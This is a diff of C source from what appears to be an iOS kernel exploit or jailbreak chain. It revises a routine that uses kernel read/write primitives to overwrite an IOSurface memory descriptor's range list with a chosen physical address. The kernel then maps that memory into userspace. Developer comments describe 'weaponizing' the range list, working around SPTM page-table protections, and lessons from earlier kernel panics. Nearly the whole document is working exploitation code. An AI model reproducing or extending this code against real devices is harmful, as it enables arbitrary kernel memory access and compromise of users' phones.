@@ -208,111 +208,66 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	static unsigned g_kmap_seq = 0;
 	unsigned seq = g_kmap_seq++;
 	jb_tr_beacon("KMAP win=%u", seq);
-	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
+	// v94 FRESH-SURFACE COLD-MAP (§64: base1==base0 in 16/16 windows on
+	// the WARM port-1337 client despite VERIFIED descriptor retargets ⇒
+	// the cached mapping lives in the per-task IOSurfaceClient). Bypass:
+	// a NEW surface per window — its client is COLD, so the FIRST
+	// GetBaseAddress must build the mapping from the surface's own
+	// (weaponized) range list. Every write = ordinary data-page heap via
+	// alias/primitive (the only SPTM-surviving store class, proven ×5).
+	// Zero PT writes. One hypothesis per launch (v94b fallback: client
+	// walk via the sr0/sr8/sr30 dump).
+	(void)cacheMode;
+	mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(0x4000);
 	if (!surfaceMachPort) {
 		jb_tr_beacon("KMAP fail,noport");
+		*uaddr = NULL;
 		return -1;
 	}
 	uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
 	uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
 	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
 	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
-	jb_tr_beacon("KMAP step1,sr=%llx,surface=%llx,desc=%llx,ranges=%llx",
+	jb_tr_beacon("KMAP fresh,sr=%llx,surface=%llx,desc=%llx,ranges=%llx",
 	             (unsigned long long)surfaceSendRight,
 	             (unsigned long long)surface,
 	             (unsigned long long)desc, (unsigned long long)ranges);
-
-	// v75: desc-side pre-state baseline. NOTE: v74's baseline read
-	// kread64(ranges)/kread64(ranges+8) — the ranges ELEMENT is a 16-byte
-	// kalloc.type6.16 object and ClearSword's fixed 32-byte RMW tripped
-	// zone bound checks → kernel panic 2026-09-05 21:37:02. LAW: never aim
-	// a ClearSword primitive at a sub-32-byte kernel object. All reads
-	// below are INSIDE the (large) memory descriptor object.
-	jb_tr_beacon("KMAP pre,desc,r60=%llx,r50=%llx,f20=%x,m28=%llx,w88=%x,d70=%llx,d18=%llx,d90=%llx",
-	             (unsigned long long)kread64(desc + 0x60),
-	             (unsigned long long)kread64(desc + 0x50),
-	             (unsigned int)kread32(desc + 0x20),
-	             (unsigned long long)kread64(desc + 0x28),
-	             (unsigned int)kread8(desc + 0x88),
-	             (unsigned long long)kread64(desc + 0x70),
-	             (unsigned long long)kread64(desc + 0x18),
-	             (unsigned long long)kread64(desc + 0x90));
-
-	// v81 PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
-	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
-	// maps (C,first=0x539,0 = own surface ID in all 20 windows, descriptor
-	// AND surface.ranges retargeted and verified). New path: take the
-	// surface's own valid 64KB mapping and rewrite its L3 PTEs to the
-	// target PA. NO IOSurface writes at all — the exit-during-rewrite
-	// panic class (00:07:39) dies here. PTE writes sit inside 4KB L3
-	// table pages (RMW LAW v2 satisfied; window is 32B-aligned, 64KB-
-	// aligned base0 ⇒ PTE index multiple of 4).
-	IOSurfaceRef refA = IOSurfaceLookupFromMachPort(surfaceMachPort);
-	jb_tr_beacon("KMAP A,lookup=%d", refA != NULL);
-	if (!refA) {
-		jb_tr_beacon("KMAP fail,lookupA");
-		*uaddr = NULL;
-		return -1;
-	}
-	void *base0 = IOSurfaceGetBaseAddress(refA);
-	jb_tr_beacon("KMAP A,base0=%llx", (unsigned long long)(uintptr_t)base0);
-	if (!base0) {
-		jb_tr_beacon("KMAP fail,base0A");
+	if (!desc || !ranges) {
+		jb_tr_beacon("KMAP fail,freshfields");
 		*uaddr = NULL;
 		return -1;
 	}
 
-	// v84: L2 REDIRECT. v83 panic (esr 9600004f, far=l3+0x770) proved the
-	// pool's L3 table page alias is UNMAPPED in kernel TTBR1 (carve-out
-	// hole) — the walk can never reach the L3. But the L2 table IS mapped
-	// and writable (l2e read ✓). So: build a fake L3 table in base0's own
-	// backing page (userspace write through the mapping — free), get its
-	// PA from the surface's ranges element read through its PAPT ALIAS
-	// (aliases bypass zone bound checks — the 16B element is unreachable
-	// only at its zone VA), and kwrite64 the L2 entry to point at it.
-	// Restore discipline: original L2 entry saved; restored at next kmap
-	// entry, at l2_restore(), and in cleanup.
-	// v93 KERNEL-MAPPED RETARGET (v92 panic 16:23:16 = SPTM WRITE LAW 1
-	// REFINED: stores into ANY page-table page are fatal — pool L2 (v89/
-	// v90), kernel-static (v24/25), AND our own user pmap L2 (v92, x3=
-	// donorPA|0x3 at +0x6334). Translation structures are SPTM-guarded,
-	// period. The only SPTM-legal way to change a mapping is to make the
-	// KERNEL do it. So: retarget the SURFACE's range list to the target PA
-	// (all writes = regular kernel-heap via alias, each class proven on
-	// device this campaign) and let IOSurfaceGetBaseAddress map it.
-	// - desc+0x60 = donor array VA (v75-proven landing, same window class)
-	// - desc+0x50 = 0x10000 (v75-proven: r50 10000→20000 landed)
-	// - desc+0x28 = 0 memRef (v75-proven; drops the old phys backing ref
-	//   chain so the re-map rebuilds from the new ranges — hypothesis under
-	//   test, beaconed separately)
-	// - donor array = 4 range entries covering pa..pa+0x10000, written via
-	//   the array alias (v89/v90/v92-proven: fake3 writes landed ×3)
-	// Decode: base1 != base0 & content varies → the getter re-maps → THIS
-	// IS the probe window → CHAIN GATE. base1 == base0 → cache lives in the
-	// IOSurfaceClient → v94 walks the send-right kobject (fields beaconed
-	// below). base1 == 0 → re-map failed, sr fields + fail beacon name it.
-	uint64_t arrVA = IOSurface_kalloc_16up(0x4000, true);
-	if (!arrVA || arrVA == (uint64_t)-1) {
-		jb_tr_beacon("KMAP fail,kalloc16up");
-		*uaddr = NULL;
-		return -1;
-	}
-	jb_tr_beacon("KMAP donor,arrva=%llx", (unsigned long long)arrVA);
-	uint64_t arrAlias = phystokv(kvtophys(arrVA));
+	// v93→v94 ARC NOTE (history): v93's KERNEL-MAPPED RETARGET proved on
+	// device that desc size/ranges/memRef retargets LAND but the warm
+	// client still serves the cached mapping (base1==base0 ×16, §64) —
+	// the cache lives in the per-task IOSurfaceClient. v94 therefore
+	// creates a FRESH surface per window (cold client) and weapons its
+	// own range list before the first GetBaseAddress. History above
+	// (v84/v93 comments) kept for the decode record.
+	// v94: the fresh surface OWNS a 16KB/1024-entry ranges array (that's
+	// how _getSurfacePort_16up builds it — no separate donor alloc needed;
+	// v93's donor runs proved this array + alias write class on device).
+	// Weaponize: overwrite the first entries with the TARGET PA ranges.
+	// - range list: 4 entries {pa+n*0x4000, 0x4000} covering the full
+	//   0x10000 probe scan, written through the array ALIAS (data-page
+	//   heap, SPTM-legal, proven ×3 runs).
+	// - desc.size@0x50 = 0x10000 (v75-proven landing class; fresh surface
+	//   already reports a sane size — this makes it exactly the scan size)
+	//   via one 32B desc window W[0x48,0x68) that also re-asserts
+	//   ranges@0x60 = its own array (paranoia readback).
+	uint64_t arrAlias = phystokv(kvtophys(ranges));
 	if (!arrAlias) {
 		jb_tr_beacon("KMAP fail,arralias");
 		*uaddr = NULL;
 		return -1;
 	}
-	uint64_t arrOff = arrVA & 0x3FFFULL;
+	uint64_t arrOff = ranges & 0x3FFFULL;
 	if (arrOff + 4 * 0x10 > 0x4000) {
 		jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx", (unsigned long long)arrOff);
 		*uaddr = NULL;
 		return -1;
 	}
-	// 4 range entries: {addr=pa+n*0x4000, size=0x4000} — covers the whole
-	// 0x10000 probe scan. Written through the donor ALIAS (data-page heap:
-	// SPTM-legal, proven ×3).
 	for (int ei = 0; ei < 4; ei++) {
 		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x0, pa + ei * 0x4000ULL);
 		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x8, 0x4000ULL);
@@ -322,61 +277,48 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(arrAlias + arrOff),
 	             (unsigned long long)kread64(arrAlias + arrOff + 8));
 
-	// Retarget the descriptor via its alias windows (all inside the large
-	// desc object — RMW-law compliant, v75-verified landing on 18.2).
-	// W [0x48,0x68): size@0x50 + ranges@0x60 in ONE window.
+	// desc.size retarget via W[0x48,0x68) (v93-proven window/offsets).
 	uint8_t winA[0x20];
 	if (kreadbuf(desc + 0x48, winA, sizeof(winA)) != 0) {
 		jb_tr_beacon("KMAP fail,readA,desc=%llx", (unsigned long long)desc);
 		*uaddr = NULL;
 		return -1;
 	}
-	*(uint64_t *)(winA + (0x50 - 0x48)) = 0x10000ULL;      // size
-	*(uint64_t *)(winA + (0x60 - 0x48)) = arrVA;          // ranges → donor
+	*(uint64_t *)(winA + (0x50 - 0x48)) = 0x10000ULL;   // size = scan size
+	*(uint64_t *)(winA + (0x60 - 0x48)) = ranges;       // re-assert own array
 	if (kwritebuf(desc + 0x48, winA, sizeof(winA)) != 0) {
 		jb_tr_beacon("KMAP fail,writeA,desc=%llx", (unsigned long long)desc);
 		*uaddr = NULL;
 		return -1;
 	}
-	// W [0x18,0x38): memRef@0x28 → 0 (cache-buster, hypothesis beaconed).
-	uint8_t winB[0x20];
-	if (kreadbuf(desc + 0x18, winB, sizeof(winB)) != 0) {
-		jb_tr_beacon("KMAP fail,readB,desc=%llx", (unsigned long long)desc);
-		*uaddr = NULL;
-		return -1;
-	}
-	*(uint64_t *)(winB + (0x28 - 0x18)) = 0;
-	if (kwritebuf(desc + 0x18, winB, sizeof(winB)) != 0) {
-		jb_tr_beacon("KMAP fail,writeB,desc=%llx", (unsigned long long)desc);
-		*uaddr = NULL;
-		return -1;
-	}
-	jb_tr_beacon("KMAP desc,rb,r50=%llx,r60=%llx,m28=%llx",
+	jb_tr_beacon("KMAP desc,rb,r50=%llx,r60=%llx",
 	             (unsigned long long)kread64(desc + 0x50),
-	             (unsigned long long)kread64(desc + 0x60),
-	             (unsigned long long)kread64(desc + 0x28));
+	             (unsigned long long)kread64(desc + 0x60));
 
-	// Send-right kobject field dump (v94 feed: is the kobject the CLIENT?
-	// object@0x30 resolved to `surface` — but +0/+8 may be client fields).
+	// Send-right kobject field dump (v94b fallback feed, carried over).
 	jb_tr_beacon("KMAP sr0=%llx,sr8=%llx,sr30=%llx",
 	             (unsigned long long)kread64(surfaceSendRight + 0x0),
 	             (unsigned long long)kread64(surfaceSendRight + 0x8),
 	             (unsigned long long)kread64(surfaceSendRight + 0x30));
 
-	// THE KERNEL DOES THE MAPPING: fresh lookup + GetBaseAddress.
+	// THE KERNEL DOES THE MAPPING: first lookup + GetBaseAddress on the
+	// COLD client — it must build the mapping from our weaponized range
+	// list. No warm cache exists to serve.
 	IOSurfaceRef refB = IOSurfaceLookupFromMachPort(surfaceMachPort);
 	int lookupB = (refB != NULL);
 	void *base1 = lookupB ? IOSurfaceGetBaseAddress(refB) : NULL;
-	jb_tr_beacon("KMAP B,lookup=%d,base0=%llx,base1=%llx",
+	jb_tr_beacon("KMAP B,lookup=%d,base1=%llx",
 	             lookupB,
-	             (unsigned long long)(uintptr_t)base0,
 	             (unsigned long long)(uintptr_t)base1);
 	if (!lookupB || !base1) {
 		jb_tr_beacon("KMAP fail,base1");
 		*uaddr = NULL;
 		return -1;
 	}
-	// Content discriminator through the NEW mapping (kernel-driven).
+	// Content discriminator through the kernel-built mapping: target
+	// window content ⇒ COLD-MAP CONFIRMED = THE PROBE WINDOW = CHAIN
+	// GATE. 539,0-style own-ID pattern ⇒ client cache pre-populated from
+	// elsewhere (v94b). Repeated qword pattern ⇒ unmapped garbage.
 	jb_tr_beacon("KMAP C,first=%llx,%llx",
 	             (unsigned long long)*(volatile uint64_t *)base1,
 	             (unsigned long long)((volatile uint64_t *)base1)[1]);
